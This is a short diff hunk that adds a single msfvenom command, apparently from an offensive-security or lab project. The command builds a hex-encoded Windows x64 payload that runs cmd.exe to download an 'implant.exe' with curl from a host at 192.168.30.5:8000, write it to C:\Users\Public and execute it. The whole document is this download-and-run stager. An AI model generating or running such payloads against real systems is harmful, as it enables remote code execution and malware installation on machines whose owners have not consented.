@@ -1,0 +1,3 @@
+msfvenom -p windows/x64/exec \
+  CMD="cmd.exe /c curl http://192.168.30.5:8000/implant.exe -o C:\Users\Public\implant.exe && C:\Users\Public\implant.exe" \
+  -f hex
